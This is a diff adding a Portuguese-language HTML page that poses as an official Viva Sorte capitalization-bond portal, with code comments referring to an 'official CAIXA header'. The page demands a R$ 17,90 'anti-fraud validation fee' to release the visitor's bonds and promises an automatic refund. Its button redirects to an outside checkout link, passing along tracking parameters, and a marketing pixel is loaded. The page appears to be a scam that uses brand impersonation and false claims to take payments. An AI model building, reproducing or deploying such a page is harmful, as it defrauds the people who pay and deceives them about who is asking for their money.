@@ -1,0 +1,366 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Validação de Segurança - Viva Sorte</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6900c6ee33b3e27ee86ed867";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    
+    <style>
+        @font-face {
+            font-family: 'Futura-Book';
+            src: url('fonts/Futura-Book.eot');
+            src: url('fonts/Futura-Book.eot#iefix') format('embedded-opentype'),
+                url('fonts/Futura-Book.woff2') format('woff2'),
+                url('fonts/Futura-Book.woff') format('woff'),
+                url('fonts/Futura-Book.ttf') format('truetype'),
+                url('images/Futura-Book.svg#Futura-Book') format('svg');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        body {
+            font-family: 'Futura-Book', 'Inter', sans-serif !important;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        .header-oficial {
+            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
+            padding: 1rem 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+
+        .logo-caixa {
+            height: 32px;
+        }
+
+        .container-main {
+            max-width: 600px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .card-validacao {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+            margin-bottom: 2rem;
+        }
+
+        .header-seguranca {
+            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .icon-seguranca {
+            width: 60px;
+            height: 60px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+
+        .titulo-seguranca {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin: 0 0 0.5rem 0;
+            letter-spacing: 0.5px;
+        }
+
+        .subtitulo-seguranca {
+            font-size: 1rem;
+            margin: 0;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        .conteudo-principal {
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .alert-validacao {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+
+        .alert-icon {
+            color: #856404;
+            font-size: 1.2rem;
+            margin-right: 0.5rem;
+        }
+
+        .alert-titulo {
+            color: #856404;
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .valor-container {
+            text-align: center;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            border-radius: 8px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid #dee2e6;
+        }
+
+        .valor-taxa {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #28a745;
+            margin: 0;
+            line-height: 1;
+        }
+
+        .valor-descricao {
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            font-weight: 500;
+        }
+
+        .reembolso-info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+
+        .reembolso-titulo {
+            color: #0c5460;
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-validacao {
+            background: linear-gradient(135deg, #2f4eb5, #1e3a8a);
+            border: none;
+            color: white;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            width: 100%;
+            margin: 1.5rem 0;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-validacao:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(47, 78, 181, 0.3);
+            background: linear-gradient(135deg, #1e3a8a, #1e40af);
+        }
+
+        .rodape-caixa {
+            background: #173e68;
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            margin-top: 3rem;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(47, 78, 181, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(47, 78, 181, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(47, 78, 181, 0); }
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .container-main {
+                margin: 1rem auto;
+                padding: 0 0.5rem;
+            }
+            
+            .conteudo-principal {
+                padding: 1.5rem;
+            }
+            
+            .valor-taxa {
+                font-size: 2.2rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-seguranca {
+                padding: 1.5rem;
+            }
+            
+            .titulo-seguranca {
+                font-size: 1.6rem;
+            }
+            
+            .valor-taxa {
+                font-size: 1.8rem;
+            }
+            
+            .conteudo-principal {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header Oficial CAIXA -->
+    <div class="header-oficial">
+        <div class="container">
+            <div class="d-flex align-items-center justify-content-between">
+                <img src="images/viva.png" alt="Viva Sorte" class="logo-caixa">
+                <div class="text-white">
+                    <small><i class="bi bi-shield-check"></i> Portal Oficial Viva Sorte</small>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-main">
+        <!-- Card Principal de Validação -->
+        <div class="card-validacao">
+            <!-- Header de Segurança -->
+            <div class="header-seguranca">
+                <div class="icon-seguranca">
+                    <i class="bi bi-shield-exclamation text-white" style="font-size: 1.5rem;"></i>
+                </div>
+                <h1 class="titulo-seguranca">VALIDAÇÃO DE SEGURANÇA</h1>
+                <p class="subtitulo-seguranca">Sistema de Proteção Antifraude Ativado</p>
+            </div>
+
+            <!-- Conteúdo Principal -->
+            <div class="conteudo-principal">
+                <!-- Alerta de Validação -->
+                <div class="alert-validacao">
+                    <div class="alert-titulo">
+                        <i class="bi bi-exclamation-triangle alert-icon"></i>
+                        VERIFICAÇÃO DE SEGURANÇA OBRIGATÓRIA
+                    </div>
+                    <p class="mb-0">
+                        Para garantir a segurança da transferência dos seus <strong>títulos de capitalização Viva Sorte</strong>, 
+                        é necessário validar sua identidade através do nosso sistema antifraude.
+                    </p>
+                </div>
+
+                <!-- Valor da Taxa -->
+                <div class="valor-container">
+                    <div class="valor-taxa">R$ 17,90</div>
+                    <div class="valor-descricao">Taxa de Validação Antifraude</div>
+                </div>
+
+                <!-- Informação de Reembolso -->
+                <div class="reembolso-info">
+                    <div class="reembolso-titulo">
+                        <i class="bi bi-arrow-repeat"></i>
+                        REEMBOLSO GARANTIDO
+                    </div>
+                    <p class="mb-0">
+                        O valor de R$ 17,90 será automaticamente reembolsado em seus títulos.
+                        <br><strong>Validação obrigatória para liberação dos títulos</strong>
+                    </p>
+                </div>
+
+                <!-- Botão de Validação -->
+                <button class="btn-validacao" onclick="processarPagamento(1790)">
+                    <i class="bi bi-shield-check"></i>
+                    VALIDAR IDENTIDADE - R$ 17,90
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rodapé Oficial -->
+    <div class="rodape-caixa">
+        <div class="container text-center">
+            <p class="mb-2"><strong>VIVA SORTE - TÍTULOS DE CAPITALIZAÇÃO</strong></p>
+            <small>© 2025 - Todos os direitos reservados</small>
+        </div>
+    </div>
+
+    <!-- Modal de Loading -->
+    <div class="modal fade" id="loadingModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="loadingModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-body text-center p-5">
+                    <div class="spinner-border mb-3" role="status" style="width: 3rem; height: 3rem; color: #2f4eb5;">
+                        <span class="visually-hidden">Carregando...</span>
+                    </div>
+                    <h5 class="modal-title" id="loadingModalLabel">Validando...</h5>
+                    <p class="mt-2">Aguarde...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // Função para redirecionar diretamente para a página de pagamento
+        function processarPagamento(valor) {
+            // URL de destino
+            const baseUrl = 'https://www.pagamentos-seguro.link/checkout/a79ae125-c167-4989-8741-1c10629c5db6';
+
+            // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
+            const currentParams = new URLSearchParams(window.location.search).toString();
+
+            // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
+            let redirectUrl = baseUrl;
+            if (currentParams) {
+                // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
+                if (baseUrl.includes('?')) {
+                    redirectUrl += '&' + currentParams;
+                } else {
+                    redirectUrl += '?' + currentParams;
+                }
+            }
+            
+            // Redireciona o navegador do usuário para o link final instantaneamente
+            window.location.href = redirectUrl;
+        }
+    </script>
+
+ 
+</body></html>
